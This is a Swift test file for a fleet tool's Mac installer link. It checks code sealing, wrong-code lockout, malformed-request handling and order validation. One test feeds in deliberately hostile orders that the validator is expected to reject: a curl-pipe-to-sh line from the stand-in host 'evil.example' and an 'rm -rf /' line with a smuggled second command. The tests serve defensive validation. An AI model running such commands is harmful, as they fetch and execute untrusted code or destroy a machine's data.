import Foundation
import Testing
@testable import FleetCore

/// Adding a Mac that stays on (PRODUCT.md P3): the installer there shows a link code and waits; the owner's own app
/// sends the order. Both halves are here, so the link is proved on one machine over the loopback.
struct MacLinkTests {
    private let code = "7KMQ2PRJ4TVW"

    private func order(code: String, name: String = "mini-2") -> MacInstallOrder {
        MacInstallOrder(code: code, hub: "http://100.64.0.1:8765", name: name,
                        line: "curl -fsS http://100.64.0.1:8765/join | FLEET_JOIN=ABCD2PRJ4TVW sh",
                        authKey: nil)
    }

    private final class Orders: @unchecked Sendable {
        private let lock = NSLock()
        private var taken: [MacInstallOrder] = []
        func add(_ one: MacInstallOrder) { lock.lock(); taken.append(one); lock.unlock() }
        var all: [MacInstallOrder] { lock.lock(); defer { lock.unlock() }; return taken }
    }

    private func listening(_ orders: Orders) throws -> (MacInstallerListener, URL) {
        let listener = MacInstallerListener(code: code, state: MacInstallState(state: "waiting",
                                                                               says: "Waiting for your app.")) { order in
            orders.add(order)
        }
        let port = try listener.start(port: 0)
        let installer = try #require(MacInstallerClient.address("127.0.0.1:\(Int(port))"))
        return (listener, installer)
    }

    @Test func theOrderOfTheOwnersAppReachesTheInstaller() async throws {
        let orders = Orders()
        let (listener, installer) = try listening(orders)
        defer { listener.stop() }
        let client = MacInstallerClient()
        let answer = try await client.send(order(code: "7kmq-2prj-4tvw"), to: installer)
        #expect(answer.state == "waiting" || answer.state == "running")
        #expect(orders.all.count == 1)
        #expect(orders.all.first?.name == "mini-2")
        // The installer says it is running as soon as it has the order, and the app reads that with the same code.
        let state = try await client.state(code: code, from: installer)
        #expect(state.isRunning)
        #expect(state.says == "Setting up this Mac")
    }

    @Test func nothingOfTheOrderCrossesTheNetworkInTheClear() throws {
        let plain = try JSONEncoder().encode(MacInstallOrder(
            code: code, hub: "http://100.64.0.1:8765", name: "mini-2",
            line: "curl -fsS http://100.64.0.1:8765/join | FLEET_JOIN=ABCD2PRJ4TVW sh", authKey: "tskey-auth-example"))
        let sealed = try MacLinkSeal.seal(plain, code: code)
        let text = String(decoding: sealed, as: UTF8.self)
        #expect(!text.contains("tskey") && !text.contains("FLEET_JOIN") && !text.contains(code))
        #expect(MacLinkSeal.open(sealed, code: code) == plain)
        #expect(MacLinkSeal.open(sealed, code: "AAAA2PRJ4TVW") == nil)
        #expect(MacLinkSeal.open(plain, code: code) == nil)
    }

    @Test func aWrongLinkCodeIsRefusedAndTheOrderDoesNotArrive() async throws {
        let orders = Orders()
        let (listener, installer) = try listening(orders)
        defer { listener.stop() }
        let client = MacInstallerClient()
        await #expect(throws: MacLinkError.refused("That is not the link code this Mac shows.")) {
            try await client.send(order(code: "AAAA2PRJ4TVW"), to: installer)
        }
        #expect(orders.all.isEmpty)
        // A state read with a wrong code says nothing about this fleet either.
        await #expect(throws: MacLinkError.self) { try await client.state(code: "AAAA2PRJ4TVW", from: installer) }
    }

    @Test func threeWrongCodesStopTheInstallerFromTakingAnything() async throws {
        let orders = Orders()
        let (listener, installer) = try listening(orders)
        defer { listener.stop() }
        let client = MacInstallerClient()
        for _ in 0..<3 {
            _ = try? await client.send(order(code: "AAAA2PRJ4TVW"), to: installer)
        }
        await #expect(throws: MacLinkError.refused("This installer stopped taking orders. Start it again on that Mac.")) {
            try await client.send(order(code: code), to: installer)
        }
        #expect(orders.all.isEmpty)
    }

    /// One raw request from somebody on the network who holds no code, and its answer.
    private func raw(_ head: String, to installer: URL) async throws -> String {
        var request = URLRequest(url: installer)
        request.httpMethod = "POST"
        _ = request
        let port = try #require(installer.port)
        let task = URLSession.shared.streamTask(withHostName: "127.0.0.1", port: port)
        task.resume()
        try await task.write(Data(head.utf8), timeout: 5)
        let answer = try? await task.readData(ofMinLength: 1, maxLength: 4096, timeout: 5)
        task.cancel()
        return String(decoding: answer?.0 ?? Data(), as: UTF8.self)
    }

    @Test func aStrangersRequestDoesNotStopTheInstaller() async throws {
        let orders = Orders()
        let (listener, installer) = try listening(orders)
        defer { listener.stop() }
        for head in ["POST /state HTTP/1.1\r\nContent-Length: -1\r\n\r\n", "POST /state HTTP/1.1\r\nContent-Length:\r\n\r\n"] {
            _ = try await raw(head, to: installer)
        }
        for _ in 0..<4 { _ = try await raw("POST /state HTTP/1.1\r\nContent-Length: 2\r\n\r\nno", to: installer) }
        // Three wrong seals stop orders, and the owner's own app still reads where the install stands.
        #expect(try await MacInstallerClient().state(code: code, from: installer).state == "waiting")
    }

    @Test func oneOrderIsTakenOnceAndNotTwice() async throws {
        let orders = Orders()
        let (listener, installer) = try listening(orders)
        defer { listener.stop() }
        let client = MacInstallerClient()
        _ = try await client.send(order(code: code), to: installer)
        await #expect(throws: MacLinkError.self) { try await client.send(order(code: code), to: installer) }
        #expect(orders.all.count == 1)
    }

    @Test func anOrderThatStoppedBeforeAnyWorkCanBeSentAgain() async throws {
        let orders = Orders()
        let (listener, installer) = try listening(orders)
        defer { listener.stop() }
        let client = MacInstallerClient()
        _ = try await client.send(order(code: code), to: installer)
        listener.takeAgain(MacInstallState(state: "failed", says: "This Mac is not on your private network."))
        #expect(try await client.state(code: code, from: installer).failed)
        _ = try await client.send(order(code: code), to: installer)
        #expect(orders.all.count == 2)
    }

    @Test func aTryAgainAtThatMacIsWhatTheLinkSaysAndHoldsOffANewOrder() async throws {
        let orders = Orders()
        let (listener, installer) = try listening(orders)
        defer { listener.stop() }
        let client = MacInstallerClient()
        _ = try await client.send(order(code: code), to: installer)
        listener.takeAgain(MacInstallState(state: "failed", says: "The setup stopped."))
        listener.workAgain(MacInstallState(state: "running", says: "Setting up this Mac"))
        #expect(try await client.state(code: code, from: installer).state == "running")
        await #expect(throws: MacLinkError.self) { try await client.send(order(code: code), to: installer) }
        #expect(orders.all.count == 1)
    }

    @Test func theChecklistComesBackThroughTheSameLink() async throws {
        let orders = Orders()
        let (listener, installer) = try listening(orders)
        defer { listener.stop() }
        let checks = [VerifyCheck(check: "services", state: "ok", says: "com.agentfleet.mini-2 is running"),
                      VerifyCheck(check: "runtime_signed_in", state: "fail", says: "claude is not signed in",
                                  fix: "Machines, this machine, Sign in.")]
        listener.update(MacInstallState(state: "done", says: "This Mac is in your fleet.",
                                        steps: [MacInstallStep(step: "join", title: "Join your fleet", state: "done",
                                                               says: "This Mac joined your fleet.")],
                                        verify: checks))
        let state = try await MacInstallerClient().state(code: code, from: installer)
        #expect(state.isDone)
        let checklist = try #require(state.checklist)
        #expect(checklist.isReady == false)
        #expect(checklist.line == "NOT READY: runtime_signed_in")
        #expect(checklist.checks.map(\.check) == ["services", "runtime_signed_in"])
    }

    @Test func anOrderThatIsNotThisFleetsOwnIsNotRun() async throws {
        let orders = Orders()
        let (listener, installer) = try listening(orders)
        defer { listener.stop() }
        let client = MacInstallerClient()
        // A line that is not the hub's own line, a line with a second command in it, a name the hub would refuse.
        let wrong = [MacInstallOrder(code: code, hub: "http://100.64.0.1:8765", name: "mini-2",
                                     line: "curl -fsS http://evil.example/join | FLEET_JOIN=ABCD2PRJ4TVW sh"),
                     MacInstallOrder(code: code, hub: "http://100.64.0.1:8765", name: "mini-2",
                                     line: "rm -rf / # curl -fsS http://100.64.0.1:8765/join FLEET_JOIN=x"),
                     MacInstallOrder(code: code, hub: "http://100.64.0.1:8765", name: "Mini_2",
                                     line: "curl -fsS http://100.64.0.1:8765/join | FLEET_JOIN=ABCD2PRJ4TVW sh")]
        for one in wrong {
            #expect(one.isValid == false, "\(one.line) passed as an order")
            await #expect(throws: (any Error).self) { try await client.send(one, to: installer) }
        }
        #expect(orders.all.isEmpty)
    }

    @Test func theAddressTheInstallerShowsIsReadAsTheOwnerTypesIt() {
        #expect(MacInstallerClient.address("192.168.1.42")?.absoluteString == "http://192.168.1.42:8767")
        #expect(MacInstallerClient.address(" 192.168.1.42:9000 ")?.absoluteString == "http://192.168.1.42:9000")
        #expect(MacInstallerClient.address("http://192.168.1.42")?.absoluteString == "http://192.168.1.42:8767")
        #expect(MacInstallerClient.address("mac-mini.local")?.absoluteString == "http://mac-mini.local:8767")
        #expect(MacInstallerClient.address("192.168.1.42/install") == nil)
        #expect(MacInstallerClient.address("") == nil)
        #expect(MacInstallerClient.address("192.168.1.42:0") == nil)
    }
}
